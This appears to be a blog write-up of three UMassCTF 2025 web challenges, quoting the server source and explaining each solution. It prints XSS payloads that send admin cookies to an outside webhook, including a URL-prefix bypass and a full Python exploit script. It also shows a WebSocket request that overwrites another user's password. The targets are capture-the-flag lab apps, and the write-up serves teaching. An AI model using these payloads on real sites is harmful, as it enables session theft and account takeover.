---
title: UMassCTF 2025 Write Up
date: 2025-04-22
categories: [UMassCTF, WriteUp]
tags: [web]     # TAG names should always be lowercase
---


# Description 
This is the write up for 5 web challenges in UMassCTF 2025


## Rush Hour

| Solves | Points | Tags          |
|--------|--------|---------------|
| 49     | 388    | `web`, `medium` |

**Description:**  
It's almost rush hour at Papa's Freezeria! Let's start writing those orders down!

**Source Code:** [Rush_Hour.zip](/assets/source/umassctf-2025/Rush_Hour.zip)

Firstly, I check where the flag is located.
```python
app.get('/user/:id',async (req,res)=>{
  if(!req.params || !(await client.exists(req.params.id))){

    return res.redirect('/')
  }

  let notes = await get_cache(req.params.id);

  if(req.params.id.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!");
  } else if (req.params.id.includes("admin") && req.ip == '::ffff:127.0.0.1' && !banned_fetch_dests.includes(req.headers['sec-fetch-dest'])) {
    res.cookie('supersecretstring', process.env.FLAG);
  }
```
Looks like we are going to do some xss things as the flag is in the admin's cookie.

Here's what we have on the main page:

![Rush Hour Main Page](/assets/source/umassctf-2025/Rush_Hour/index.png)

We are able to add notes, but the length is limited:
```python
app.get('/create',async (req,res)=>{
  ...
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.query.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.query.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  ...
```

Looking at the server code, there are several key points. There are 2 functions that handle the same route, but one use get and the other use post. This looks a little bit redundant as both of them are almost the same.

```python
app.get('/create',async (req,res)=>{
  if(!req.cookies || !req.cookies.user || !(await client.exists(req.cookies.user))){
    return res.send("Hmm are you even a user? Go to /");
  }
  if(!req.query.note){
    return res.send("Did not get a note")
  }
  if(req.cookies.user.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!")
  } else if(!req.cookies.user.includes("admin") && req.ip == '::ffff:127.0.0.1') {
    return res.send("Admins are not allowed to doctor user notes!");
  }
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.query.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.query.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  let user_note = await get_cache(req.cookies.user);
  if(!user_note) {
    return res.send("Problem while fetching notes! Try something else perhaps?")
  }
  user_note.push(req.query.note);
  await set_cache(req.cookies.user,user_note);
  return res.send("Note uploaded!")
})
```

```python
app.post('/create',async (req,res)=>{
  if(!req.cookies || !req.cookies.user || !(client.exists(req.cookies.user))){
    return res.send("Hmm are you even a user? Go to /");
  }
  if(!req.body.note){
    return res.send("Did not get a note body")
  }
  if(req.cookies.user.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!")
  } else if(!req.cookies.user.includes("admin") && req.ip == '::ffff:127.0.0.1') {
    return res.send("Admins are not allowed to doctor user notes!");
  }
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.body.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.body.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  let user_note = await get_cache(req.cookies.user);
  if(!user_note) {
    return res.send("Problem while fetching notes! Try something else perhaps?")
  }
  user_note.push(req.body.note);
  await set_cache(req.cookies.user,user_note);
  return res.redirect(`/user/${req.cookies.user}`);
})
```

The main difference here is between `req.query.note` and `req.body.note`. The first one is used when we use GET method, while the second one is used when we use POST method. Combine with the length limit, I come up with the idea of using array to bypass it.

I try to send something like:

```python
data = {
  'note[0]': """<img src=1 onerror=alert(1)>""",
  'note[1]': 'sliderboo'
}
```
And it works! My payload is reflected. Now it's time to get the flag.

![Payload Reflected](/assets/source/umassctf-2025/Rush_Hour/alert_1.png)

From the below code, if we want to have the flag cookie, the visited page id must contain the word "admin", also the page must be accessed from the localhost and the `sec-fetch-dest` header must not be set to some value in the `banned_fetch_dests` array.

```python
app.get('/user/:id',async (req,res)=>{
  ...
  if(req.params.id.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!");
  } else if (req.params.id.includes("admin") && req.ip == '::ffff:127.0.0.1' && !banned_fetch_dests.includes(req.headers['sec-fetch-dest'])) {
    res.cookie('supersecretstring', process.env.FLAG);
  }
  ...
```

Beside that, in `index.html`, looks like we have some Content Security Policy check:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="defaul-src 'none';
  connect-src 'none';" />
```

If we look carefully, we can see that the `default-src` is a typo, it should be `default-src`. This means that we only need to consider the `connect-src` directive. From chat GPT:

```
The connect-src directive in a Content Security Policy (CSP) controls which URLs the browser is allowed to connect to using JavaScript APIs like:
  [-] fetch()
  [-] XMLHttpRequest
  [-] WebSockets (ws:// or wss://)
  [-] EventSource (Server-Sent Events)
```

That's not a big problem. There are many ways to bypass this such as using `iframe` or `img` or `svg` tag. I choose to use `svg` tag with `onload` event.

```html
<svg onload=location.href="http://webhook.site/your-web-hook?cookie="+document.cookie>
```

Of course life is not easy like that. Although the payload works and we do get the cookie, but what we need is the flag cookie, not the user cookie. So we still have some work to do.

![Dump Payload](/assets/source/umassctf-2025/Rush_Hour/dump_payload.png)

As mentioned above, in order to get the flag cookie, we need make the admin bot get to their own page. As we have already know the admin's id (it is exposed in `/report/:id` or we can obtain it from the above payload), we can craft a payload that redirect the admin bot to their page and then redirect again to our webhook. Or simplier, just get to `/`, the page will auto redirect to `/report/:id`.

```python
app.get('/', async (req, res) => {
  let UID;
  if(!req.cookies || !req.cookies.user || !(await client.exists(req.cookies.user))){
    UID = uuidv4();
    await set_cache(UID,["This is my first note!"]);
    await set_cache(UID + "_cust",0);
    res.set({'Set-Cookie':`user=${UID}`});
  } else {
    UID = req.cookies.user;
  }
  res.redirect(`/user/${UID}`);
})
```

My final payload looks like this:

```html
<svg onload="window.open('/');setTimeout(() => location.href='http://webhook.site/your-web-hook?cookie='+document.cookie, 2000)">
```

I use `window.open` to make the admin bot to get to `/` (which will then redirect the bot to its page and get the flag cookie), use `setTimeout` to wait for the page to load, then just redirect to my webhook.

**Final flag:**
`UMASS{tH3_cl053Rz_@re_n0_m@tcH}`


## Rush Hour v2

| Solves | Points | Tags          |
|--------|--------|---------------|
| 40     | 426    | `web`, `hard(?)` |

**Description:**  
The closers are upon us! Do you have what it takes to meet their demands?

**Source Code:** [Rush_Hour_V2.zip](/assets/source/umassctf-2025/Rush_Hour_V2.zip)

This challenge is almost similar to the previous one, except from `admin.js`. This time, we have an additional check 

```python
page.on('request', (request) => {
  if (!request.url().startsWith("http://127.0.0.1:3000")) {
    request.abort();
  } else {
    request.continue();
  }
});
```

With those who familiar with WAF bypass, this is just a piece of cake. We can just use `@` to bypass the check. The payload is similar to the previous challenge. Below is the exploit script:

```python
import requests

host = 'localhost'
port = 80
url = f'http://{host}:{port}/'

webhook = 'webhook.site/your-web-hook'
session = requests.session()

def login():
    res = session.get(url)

def create_note():
    data = {
        'note[0]': f"""<svg onload="window.open('/');setTimeout(() => location.href='http://127.0.0.1:3000@{webhook}?cookie='+document.cookie, 2000)">""",
        'note[1]': 'sliderboo'
    }
    print(data)
    res = session.post(url + 'create', data=data)

def report():
    res = session.get(url + 'report/' + session.cookies['user'])
    print(res.text)

login()
create_note()
report()
```

**Final flag:**
`UMASS{k@hUnA_mY_b310v3D1!!1!}`

## Falling Blocks

| Solves | Points | Tags          |
|--------|--------|---------------|
| 45     | 423    | `web`, `easy` |

**Description:**  
One of the most iconic games has made a come back as the Falling Blocks game! However, there are 3 unbeatable players dominating top 3 at all times. Can you hack the game and make it to top 3?

**Source Code:** [falling-blocks.zip](/assets/source/umassctf-2025/falling-blocks.zip)

The challenge is a simple game where we need to achive more than 10000 points and then press logout to get the flag:

```python
app.get('/logout', utils.authMiddleware, async (req, res) => {
    if (req.user.username !== await client.HGET(req.user.username, 'username')) {
        return res.json({ "message": "Stop cheating!" });
    }
    const score = await client.HGET(req.user.username, 'score');
    if (score > 10000) {
        return res.json({ "message": process.env.FLAG });
    }
    res.clearCookie("user");
    res.redirect("/login");
});
```

However, whenever we achive more than 10000 points, the score will be reset to 0. This is done by the following code:

```python
wss.on('connection', (ws, req) => {
    console.log('Player connected');
    ...
    if (data.type && data.time && data.score) {
        if (data.type === 'gameOver') {
            let score = data.score;
            if (score > 10000) {
                data.score = 0;
            }
            userdata = Object.assign(userdata, data);
            userdata.score = Math.max(userdata.score, await client.HGET(userdata.username, "score"));
            await client.HSET(userdata.username, userdata);
            scoreboard.addScore(userdata.score, userdata.username);
        }
    }
    ...
});
```

I open burpsuite and intercept the request. I see that the score when I lost is sent in a json format:

```json
{"type":"gameOver","time":"3:05:34 PM","score":256}
```

I try to play around with this a little bit, for example setting the score to very large or very small number (negative number), but it doesn't work. Then, i decide to take a closer look at the code and i see this:

```python
(async () => {
    client.on('error', err => console.log('Redis Client Error', err));
    await client.connect();
    const dream = { "username": "Dream", "password": crypto.randomBytes(64).toString('hex'), "score": 10001, 'tokens': '0' };
    await client.HSET("Dream", dream);
    await utils.createToken("Dream", client);
    const ssundae = { "username": "Ssundae", "password": crypto.randomBytes(64).toString('hex'), "score": 66666, 'tokens': '0' };
    await client.HSET("Ssundae", ssundae);
    await utils.createToken("Ssundae", client);
    const muselk = { "username": "Muselk", "password": crypto.randomBytes(64).toString('hex'), "score": 30303, 'tokens': '0' };
    await client.HSET("Muselk", muselk);
    await utils.createToken("Muselk", client);
    scoreboard.addScore(dream.score, dream.username);
    scoreboard.addScore(ssundae.score, ssundae.username);
    scoreboard.addScore(muselk.score, muselk.username);
})();
```

This is the part where the top 3 players are set. I realize that the way the server set the database of the user `await client.HSET(userdata.username, userdata);` is verry similar to the way it do with the default players `await client.HSET("Dream", dream);`. I wonder if what i can send to the server is just type, time and score or not. So I try to send the following payload:

```json
{"type":"gameOver","time":"3:05:34 PM","score":100001,"username":"Dream","password":"sliderboo"}
```

I then logout from my current account and login with the account `Dream` and password `sliderboo`. By some magic (or may be not magic), I am able to login with the account `Dream`. I then press logout immediately (because I know if I hit the falling blocks, I will lose and the score will be reset) and I get the flag.

**Final flag:**
`UMASS{F@lLiNgH@rD_0N_w3bS0cK3ts!437}`
